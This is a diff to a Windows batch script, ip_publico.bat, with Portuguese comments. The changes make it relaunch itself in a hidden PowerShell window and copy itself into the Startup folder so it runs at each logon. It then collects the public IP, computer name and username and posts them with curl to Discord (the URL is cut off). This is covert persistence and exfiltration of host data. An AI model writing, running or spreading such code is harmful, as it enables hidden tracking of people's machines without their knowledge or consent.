@@ -1,9 +1,20 @@
 @echo off
 
-set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
-if /I not "%~f0"=="%STARTUP%\ip_publico.bat" copy "%~f0" "%STARTUP%\ip_publico.bat" >nul
+:: --------- BLOCO PARA RODAR OCULTO ----------
+if "%~1" NEQ "hidden" (
+    powershell -NoProfile -WindowStyle Hidden -Command ^
+    "Start-Process '%~f0' -ArgumentList hidden -WindowStyle Hidden"
+    exit
+)
+:: -------------------------------------------
 
 setlocal
+
+:: Coloca no Startup
+set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+if /I not "%~f0"=="%STARTUP%\ip_publico.bat" (
+    copy "%~f0" "%STARTUP%\ip_publico.bat" >nul
+)
 
 :: Pega IP público
 for /f %%A in ('curl -s https://api.ipify.org') do set IP=%%A
@@ -11,10 +22,12 @@ for /f %%A in ('curl -s https://api.ipify.org') do set IP=%%A
 :: Tempo mínimo pra não matar o curl
 ping 127.0.0.1 -n 2 >nul
 
+:: Infos
 set PC=%COMPUTERNAME%
 set USER=%USERNAME%
 set MESSAGE=PC %PC% - Usuario %USER% - IP publico %IP%
 
+:: Envia pro Discord
 curl -s ^
 -H "Content-Type: application/json" ^
 -X POST ^
